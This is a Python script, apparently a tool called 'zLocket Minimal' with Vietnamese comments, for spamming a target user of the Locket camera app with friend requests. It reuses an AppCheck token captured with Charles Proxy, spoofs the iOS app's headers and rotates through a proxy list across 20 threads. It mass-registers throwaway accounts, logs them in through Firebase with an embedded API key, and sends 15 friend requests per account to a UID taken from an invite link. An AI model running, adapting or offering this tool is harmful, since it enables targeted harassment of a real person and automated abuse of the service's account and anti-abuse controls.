import os
import re
import time
import json
import queue
import string
import random
import threading
import datetime
import requests
import urllib3
from queue import Queue
from urllib.parse import urlparse, parse_qs, urlencode

# Tắt cảnh báo SSL cho gọn log
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class zLocketMinimal:
    def __init__(self):
        self.FIREBASE_GMPID = "1:641029076083:ios:cc8eb46290d69b234fa606"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.SV_FRQ_URL = "https://thanhdieu-server.vercel.app/api/locket-friend-requests"
        self.TOKEN_FILE = "token.json"
        
        self.FIREBASE_APP_CHECK = self._init_token()
        self.TARGET_FRIEND_UID = None
        self.NAME_TOOL = "zLocket Minimal"
        self.ACCOUNTS_PER_PROXY = random.randint(6, 10)
        
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()

    def _log(self, msg):
        now = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{now}] {msg}")

    def _init_token(self):
        # Kiểm tra file token cũ
        if os.path.exists(self.TOKEN_FILE):
            with open(self.TOKEN_FILE, 'r') as f:
                data = json.load(f)
                if data.get('expiry', 0) > time.time():
                    self._log("Dùng lại token AppCheck từ file.")
                    return data['token']
        
        # Nhập tay AppCheck
        print("\n" + "="*50)
        print("NHẬP MÃ X-Firebase-AppCheck (TỪ CHARLES PROXY):")
        token = input(">>> ").strip()
        if not token:
            print("Lỗi: Token không được trống!")
            exit()
        
        # Lưu lại dùng cho lần sau
        with open(self.TOKEN_FILE, 'w') as f:
            json.dump({'token': token, 'expiry': time.time() + 1800}, f)
        return token

    def get_headers(self, auth_token=None):
        h = {
            'Host': 'api.locketcamera.com',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Content-Type': 'application/json',
        }
        if auth_token:
            h['Authorization'] = f"Bearer {auth_token}"
        return h

    def get_firebase_headers(self):
        return {
            'Host': 'www.googleapis.com',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'Content-Type': 'application/json',
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2'
        }

    def _extract_uid(self, url):
        # Xử lý nhanh link locket camera
        if "invites/" in url:
            return url.split("invites/")[1][:28]
        try:
            r = requests.get(url, timeout=5)
            match = re.search(r'link=([^&"]+)', r.text)
            if match:
                import urllib.parse
                real_url = urllib.parse.unquote(match.group(1))
                return real_url.split("invites/")[1][:28]
        except: pass
        return None

    def menu(self):
        print("\n--- ZLOCKET MINIMAL MENU ---")
        print("1. Spam kết bạn")
        print("2. Xóa yêu cầu kết bạn (Cần Login)")
        choice = input("Chọn: ")
        
        if choice == "1":
            target = input("Nhập link Locket mục tiêu: ").strip()
            self.TARGET_FRIEND_UID = self._extract_uid(target)
            if not self.TARGET_FRIEND_UID:
                print("Không tìm thấy UID!"); return
            self.NAME_TOOL = input("Nhập tên hiển thị (Custom Name): ").strip() or "Locket User"
            self.start_spam()
        else:
            print("Tính năng xóa yêu cầu đang bảo trì cho bản Basic.")

    def start_spam(self):
        proxies = []
        if os.path.exists('proxy.txt'):
            with open('proxy.txt', 'r') as f:
                proxies = [l.strip() for l in f if l.strip()]
        
        if not proxies:
            print("Hãy tạo file proxy.txt (định dạng ip:port)"); return

        q = Queue()
        for p in proxies: q.put(p)
        
        threads = []
        num_threads = min(len(proxies), 20) # Chạy 20 luồng cho ổn định
        print(f"Đang chạy {num_threads} luồng...")
        
        for i in range(num_threads):
            t = threading.Thread(target=self.worker, args=(i, q))
            t.start()
            threads.append(t)
            
        for t in threads: t.join()

    def worker(self, tid, q):
        while not q.empty():
            proxy = q.get()
            px_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            
            for _ in range(self.ACCOUNTS_PER_PROXY):
                email = "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"
                pw = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
                
                try:
                    # 1. Reg
                    r1 = requests.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", 
                                     headers=self.get_headers(),
                                     json={"data": {"email": email, "password": pw, "platform": "ios"}},
                                     proxies=px_dict, timeout=10)
                    
                    if r1.status_code == 200:
                        # 2. Login
                        r2 = requests.post(f"{self.FIREBASE_AUTH_URL}/verifyPassword?key={self.FIREBASE_API_KEY}",
                                         headers=self.get_firebase_headers(),
                                         json={"email": email, "password": pw, "returnSecureToken": True},
                                         proxies=px_dict, timeout=10)
                        
                        token = r2.json().get('idToken')
                        if token:
                            # 3. Profile
                            requests.post(f"{self.API_LOCKET_URL}/finalizeTemporaryUser", 
                                        headers=self.get_headers(token),
                                        json={"data": {"username": "".join(random.choices(string.ascii_lowercase, k=8)), "first_name": self.NAME_TOOL}},
                                        proxies=px_dict, timeout=10)
                            
                            # 4. Spam 15 lần
                            for _ in range(15):
                                requests.post(f"{self.API_LOCKET_URL}/sendFriendRequest", 
                                            headers=self.get_headers(token),
                                            json={"data": {"user_uid": self.TARGET_FRIEND_UID, "source": "signUp"}},
                                            proxies=px_dict, timeout=10)
                            
                            with self.lock:
                                self.success_count += 1
                                self._log(f"Thread-{tid} | OK: {email} | Tổng: {self.success_count}")
                except:
                    break # Lỗi proxy thì đổi

if __name__ == "__main__":
    tool = zLocketMinimal()
    tool.menu()
